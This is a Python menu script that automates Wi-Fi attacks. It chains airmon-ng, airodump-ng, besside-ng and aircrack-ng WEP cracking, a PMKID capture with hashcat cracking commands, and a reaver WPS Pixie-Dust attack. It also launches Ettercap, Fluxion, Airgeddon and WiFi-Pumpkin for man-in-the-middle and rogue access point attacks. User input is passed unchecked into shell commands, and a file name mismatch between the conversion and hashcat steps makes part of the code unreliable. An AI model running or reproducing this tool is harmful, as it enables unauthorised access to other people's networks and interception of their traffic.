import os
from colorama import Fore, Style


interface = input(Fore.CYAN + '[*]Enter interface to use: ' + Style.RESET_ALL)
os.system('airmon-ng start ' + interface)

def wait():
  wait = input('PRESS ENTER TO CONTINUE')

def main():
  print('       _   __     __      ______     ______       __')
  print('      / | / /__  / /_    / ____/____/ ____ \_____/ /__')
  print('     /  |/ / _ \/ __/   / /   / ___/ / __ `/ ___/ //_/')
  print('    / /|  /  __/ /_    / /___/ /  / / /_/ / /__/ ,<')
  print('   /_/ |_/\___/\__/____\____/_/   \ \__,_/\___/_/|_|')
  print('                 /_____/           \____/')
  print('==========================================================')
  print('*[1] Scan Local Networks (Airodump-ng)                   *')
  print('*[2] Scan Local Networks (Wash)                          *')
  print('*[3] Crack WEP Network                                   *')
  print('*[4] Crack WPA/WPA2 Network Using PMKID Method           *')
  print('*[5] Crack WPA/WPA2 Network Using PIN (Pixie-Dust) Method*')
  print('*[6] Wifite2 (Automated Network Cracker)                 *')
  print('*[7] Ettercap (MiTM Attack)                              *')
  print('*[8] Fluxion (MiTM/Router Spoof Attack)                  *')
  print('*[9] Airgeddon (Attack Framework - Graphical)            *')
  print('*[10] WiFi-Pumpkin (Rogue AP - Graphical)                *')
  print('*[11] Exit                                               *')
  print('==========================================================')
  in_put = input(': ')
  if in_put == '1':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('airodump-ng ' + interface + 'mon')
    wait()
  if in_put == '2':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('wash -i ' + interface + 'mon')
    wait()
  if in_put == '3':
    bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
    os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
    os.system('aircrack-ng wep.cap')
    wait()
  if in_put == '4':
    adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
    if adapt == 'y' or adapt == 'Y':
      bssid = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network BSSID: ' + Style.RESET_ALL)
      channel = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network Channel: ' + Style.RESET_ALL)
      print(Fore.CYAN + '[*]Starting PMKID Attack...')
      print('[*]Wait about 10 minutes to gather enough packets, use ^C or ^Z to end hcxdumptool...' + Style.RESET_ALL)
      os.system('hcxdumptool -i ' + interface + 'mon -o output.pcapng --enable_status=1')
      print(Fore.CYAN + '[*]Converting output.pcapng to ouputHC.16800 for hashcat bruteforcing...' + Style.RESET_ALL)
      os.system('hcxpcaptool -E essidlist -I identitylist -U usernamelist -z outputHC.18600 output.pcapng')
      print(Fore.GREEN + '[+]File Converted! Use hashcat in these two methods to crack: ' + Style.RESET_ALL)
      print(Fore.CYAN + '  [*]  Wordlist: hashcat -m 16800 outputHC.16800 -a 0 --force wordlist.lst -O')
      print(Fore.CYAN + '  [*]Bruteforce: hashcat -m 16800 outputHC.16800 -a 3 --force ?a?a?a?a?a?a -O')
      wait()
    else:
      print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
      wait()
  if in_put == '5':
    bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
    wait()
  if in_put == '6':
    print(Fore.CYAN + '[*]Starting Wifite2...' + Style.RESET_ALL)
    try:
      os.chdir('wifite2')
      os.system('python3 Wifite.py')
      print(Fore.GREEN + '[+]Successfully ran wifite.py!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running wifite.py' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '7':
    got = input(Fore.CYAN + '[*]Do you want to run ettercap in Graphical or Text mode?[G/T]: ' + Style.RESET_ALL)
    try:
      if got == 'G':
        print(Fore.CYAN + '[*]Running ettercap in graphical mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -G')
        print(Fore.GREEN + '[+]Successfully ended ettercap in graphical mode!' + Style.RESET_ALL)
      else:
        print(Fore.CYAN + '[*]Running ettercap in text mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -T')
        print(Fore.GREEN + '[+]Successfully ended ettercap in text mode!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running ettercap!' + Style.RESET_ALL)
    wait()
  if in_put == '8':
    print(Fore.CYAN + '[*]Starting Fluxion...' + Style.RESET_ALL)
    try:
      os.chdir('fluxion')
      os.system('./fluxion.sh')
      print(Fore.GREEN + '[+]Successfully ran fluxion.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running fluxion.sh' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '9':
    print(Fore.CYAN + '[*]Starting Airgeddon...' + Style.RESET_ALL)
    try:
      os.chdir('airgeddon')
      os.system('./airgeddon.sh')
      print(Fore.GREEN + '[+]Successfully ran airgeddon.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running airgeddon.sh' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '10':
    print(Fore.CYAN + '[*]Starting WiFi-Pumpkin...' + Style.RESET_ALL)
    try:
      os.system('sudo wifi-pumpkin')
      print(Fore.GREEN + '[+]Successfully ran WiFi-Pumpkin!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running WiFi-Pumpkin' + Style.RESET_ALL)
    wait()
  if in_put == '11':
    print(Fore.CYAN + '[*]Shutting down ' + interface + 'mon...' + Style.RESET_ALL)
    os.system('airmon-ng stop ' + interface)
    os.system('airmon-ng stop ' + interface + 'mon')
    os.system('ifconfig ' + interface + ' up')
    exit()
  else:
    print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
  main()
main()
